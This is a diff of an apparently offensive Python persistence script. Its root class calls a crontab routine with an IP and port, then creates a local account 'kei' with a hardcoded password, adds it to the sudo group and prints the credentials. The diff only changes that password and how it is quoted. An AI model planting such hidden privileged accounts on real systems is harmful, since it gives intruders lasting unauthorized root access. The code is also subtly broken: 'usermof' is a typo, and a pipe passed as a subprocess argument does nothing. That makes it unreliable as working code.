@@ -72,7 +72,7 @@ class funcs:
         print(f"{bcolors.GREEN}[+] Creating local account...{bcolors.ENDC}")
         subprocess.run(['useradd', '-m', '-s', '/bin/bash', username], check=True, stdout=subprocess.DEVNULL)
         subprocess.run(['usermof', '-aG', 'sudo', username], check=True, stdout=subprocess.DEVNULL)
-        subprocess.run(['echo', password, '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
+        subprocess.run(['echo', f"'{password}'", '|', 'passwd', username, '--stdin'], check=True, stdout=subprocess.DEVNULL)
         print(f"{bcolors.GREEN}[+] Done creating local account {username}:{password}.{bcolors.ENDC}")
 
 class user:
@@ -89,7 +89,7 @@ class root:
         self.port = port
 
         funcs().crontab(self.ip, self.port)
-        funcs().create_local_account('kei', 'testPasswd123')
+        funcs().create_local_account('kei', 'ILikeYouSoMuch<3')
 
 
 if __name__ == '__main__':
